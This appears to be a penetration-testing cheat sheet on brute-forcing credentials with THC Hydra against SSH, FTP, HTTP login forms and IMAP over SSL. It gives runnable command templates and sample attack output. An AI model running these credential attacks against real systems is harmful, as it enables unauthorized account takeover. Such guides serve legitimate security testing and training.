# THC Hydra
[THC Hydra](https://sectools.org/tool/hydra/) is a tool commonly used to brute force user credentials. Always remember that you are at the mercy of your wordlists during these types of attacks. The longer, more accurate/finely-tuned wordlist = the fatser you get positive results.
## SSH Brute Force
To brute force SSH credentials, use the following command. This will brute force the credentials for the `root` user.

```
root@kali:~# hydra -l root -P /wordlists/rockyou.txt (target ip address) ssh
[WARNING] Many SSH configurations limit the number of parallel tasks, it is \
recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344423 login tries (l:1/p:0), ~14344423 tries per task
[DATA] attacking ssh://(target ip address):22/
[STATUS] 257.00 tries/min, 257 tries in 00:00h, 0 to do in 01:00h, 14344167 active
[STATUS] 245.00 tries/min, 735 tries in 00:00h, 0 to do in 03:00h, 14343689 active
[STATUS] 231.14 tries/min, 1618 tries in 00:00h, 0 to do in 07:00h, 14342806 active
```

## FTP Brute Force
To brute for an FTP service with a known username try the following command.

`hydra -l (UID) -P /path/to/500-worst-passwords.txt (TARGET IP ADDRESS) ftp`

## HTTP
To brute for an HTTP form, try the following syntax with `hydra`:

`hydra -l (USERNAME) -P /path/to/wordlist.txt (TARGET IP ADDRESS) http-post-form "/URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^&(HTML FORM PASSWORD ATTRIBUTE)=^PASS^&Login=Login:(FAILED LOGIN MESSAGE)"`

Where `HTML FORM USERNAME ATTRIBUTE` is the HTML form username "name" attribute. E.g.: `<input type=text name="username" />` In that example, the `username` value for the attribute `name` is what would be used. Same gfoes for the password: `<input type=password name="passwd" />` In that exmaple `passwd` would be used to construct the command as it is the value of the password input's name attribute. The command would then look something like so:

  ... `:username=^USER^&passwd=^PASS^` ...
  
  `hydra` will fill in the `^USER^` and `^PASS^` values upon every single HTTP request with each username and password that you mean to test.
  
## SMTP (IMAP SSL)
To brute force SMTP via SSL Authentication, you must first enumerate which port ssl/imap is runniing on using `nmap`. In our case, we found port 993 as,

```
993/tcp  open  ssl/imap   Dovecot imapd
|_imap-capabilities: ID more IDLE have IMAP4rev1 ENABLE LOGIN-REFERRALS SASL-IR LITERAL+ listed capabilities Pre-login post-login AUTH=PLAINA0001 OK
```

We also need to enumerate a valid username. We can hlearn how to do so from the [SMTP User Enumeration Module](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Enumeration/smtp-user-enumeration.md). After gathering these two pieces of information, we can use `hydra` to try to brute force the authentication like so:

`root@kali:~# hydra (TARGET IP ADDRESS) smtp -l (USERNAME) -P /path/to/wordlist.txt -V -s (TARGET PORT)`
